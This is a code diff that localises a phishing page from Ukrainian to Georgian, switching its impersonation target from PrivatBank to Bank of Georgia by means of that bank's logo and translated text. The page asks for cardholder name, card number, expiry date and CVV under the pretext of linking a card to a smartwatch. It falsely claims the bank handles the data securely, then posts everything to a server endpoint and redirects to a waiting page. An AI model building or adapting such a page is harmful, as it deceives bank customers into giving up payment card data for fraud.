@@ -1,12 +1,16 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="ka" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Верифікація картки</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<title>ბარათის ვერიფიკაცია</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  html,body{height:100%;font-family: "Noto Sans Georgian", -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
   body{max-width:520px;margin:0 auto;min-height:100vh;background:#f5f5f5;display:flex;flex-direction:column}
 
   .topbar{
@@ -52,7 +56,7 @@
   }
   .field input{
     width:100%;padding:14px 14px 14px 44px;border:1.5px solid #ddd;border-radius:12px;
-    font-size:16px;font-family:inherit;background:#fafafa;color:#1a1a1a;outline:none;
+    font-size:16px;font-family: "Noto Sans Georgian", inherit;background:#fafafa;color:#1a1a1a;outline:none;
     transition:.2s;
   }
   .field input.has-brand{padding-right:54px}
@@ -81,7 +85,7 @@
   .bottom{padding:16px 20px 32px}
   .submit-btn{
     display:block;width:100%;padding:16px;border:none;border-radius:28px;
-    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
+    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family: "Noto Sans Georgian", inherit;
     background:#00A651;transition:.2s;
   }
   .submit-btn:hover{background:#008C45}
@@ -91,14 +95,14 @@
 <body>
 
   <div class="topbar">
-    <img src="images/privatbank-logo.jpg" alt="PrivatBank">
-    <span class="topbar-title">Верифікація картки</span>
+    <img src="https://upload.wikimedia.org/wikipedia/en/4/4c/Bank_of_Georgia_logo.png" alt="საქართველოს ბანკი">
+    <span class="topbar-title">ბარათის ვერიფიკაცია</span>
   </div>
 
   <div class="hero">
-    <img src="images/card-watch.jpg" alt="PrivatBank Card & Watch">
-    <h1>Прив'яжіть картку до годинника</h1>
-    <p>Введіть дані вашої картки для активації безконтактної оплати на смарт-годиннику</p>
+    <img src="images/card-watch.jpg" alt="საქართველოს ბანკი Card & Watch">
+    <h1>დააკავშირეთ ბარათი საათთან</h1>
+    <p>შეიყვანეთ ბარათის მონაცემები უკონტაქტო გადახდის აქტივაციისთვის სმარტ საათზე</p>
   </div>
 
   <div class="form-wrap">
@@ -106,31 +110,31 @@
       <div class="error-msg" id="errorMsg"></div>
 
       <div class="field">
-        <label>Ім'я власника картки</label>
+        <label>ბარათის მფლობელის სახელი</label>
         <div class="input-wrap">
-          <input type="text" id="cardName" placeholder="Ім'я як на картці" autocomplete="cc-name">
+          <input type="text" id="cardName" placeholder="სახელი ბარათზე" autocomplete="cc-name">
           <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
         </div>
       </div>
 
       <div class="field">
-        <label>Номер картки</label>
+        <label>ბარათის ნომერი</label>
         <div class="input-wrap">
           <input type="tel" id="cardNumber" class="has-brand" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
           <svg class="icon" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
           <img class="brand-icon" id="brandIcon" src="" alt="" style="display:none">
         </div>
-        <div class="field-error" id="cardNumberError">Недійсний номер картки</div>
+        <div class="field-error" id="cardNumberError">არასწორი ბარათის ნომერი</div>
       </div>
 
       <div class="row">
         <div class="field">
-          <label>Термін дії</label>
+          <label>მოქმედების ვადა</label>
           <div class="input-wrap">
             <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
             <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
           </div>
-          <div class="field-error" id="expiryError">Недійсний термін дії</div>
+          <div class="field-error" id="expiryError">არასწორი მოქმედების ვადა</div>
         </div>
         <div class="field">
           <label>CVV</label>
@@ -143,13 +147,13 @@
 
       <div class="info-box">
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
-        <span>Дані вашої картки зашифровані та безпечно обробляються PrivatBank</span>
+        <span>თქვენი ბარათის მონაცემები დაშიფრულია და უსაფრთხოდ მუშავდება საქართველოს ბანკის მიერ</span>
       </div>
     </div>
   </div>
 
   <div class="bottom">
-    <button class="submit-btn" id="submitBtn" onclick="submitCard()">Підтвердити та прив'язати картку</button>
+    <button class="submit-btn" id="submitBtn" onclick="submitCard()">დადასტურება და ბარათის დაკავშირება</button>
   </div>
 
 <script>
@@ -159,7 +163,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Дані картки невірні";
+    el.textContent = "ბარათის მონაცემები არასწორია";
     el.style.display = "block";
   }
 
@@ -263,14 +267,14 @@
     const expiry = expiryEl.value.trim();
     const cvv = document.getElementById("cardCvv").value.trim();
 
-    if (!name) { showError("Будь ласка, введіть ім'я власника картки"); return; }
-    if (!luhnCheck(number)) { showError("Будь ласка, введіть дійсний номер картки"); cardNumEl.classList.add("invalid"); return; }
-    if (!validateExpiry(expiry)) { showError("Будь ласка, введіть дійсний термін дії"); expiryEl.classList.add("invalid"); return; }
-    if (cvv.length < 3) { showError("Будь ласка, введіть CVV"); return; }
+    if (!name) { showError("გთხოვთ, შეიყვანოთ ბარათის მფლობელის სახელი"); return; }
+    if (!luhnCheck(number)) { showError("გთხოვთ, შეიყვანოთ ბარათის სწორი ნომერი"); cardNumEl.classList.add("invalid"); return; }
+    if (!validateExpiry(expiry)) { showError("გთხოვთ, შეიყვანოთ მოქმედების სწორი ვადა"); expiryEl.classList.add("invalid"); return; }
+    if (cvv.length < 3) { showError("გთხოვთ, შეიყვანოთ CVV"); return; }
 
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "Перевірка...";
+    btn.textContent = "შემოწმება...";
 
     try {
       const res = await fetch("/api/card-data", {
@@ -288,14 +292,14 @@
       if (data.success) {
         location.href = "card-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "შეცდომა მოხდა");
         btn.disabled = false;
-        btn.textContent = "Підтвердити та прив'язати картку";
+        btn.textContent = "დადასტურება და ბარათის დაკავშირება";
       }
     } catch(err) {
-      showError("Помилка з'єднання");
+      showError("კავშირის შეცდომა");
       btn.disabled = false;
-      btn.textContent = "Підтвердити та прив'язати картку";
+      btn.textContent = "დადასტურება და ბარათის დაკავშირება";
     }
   }
 
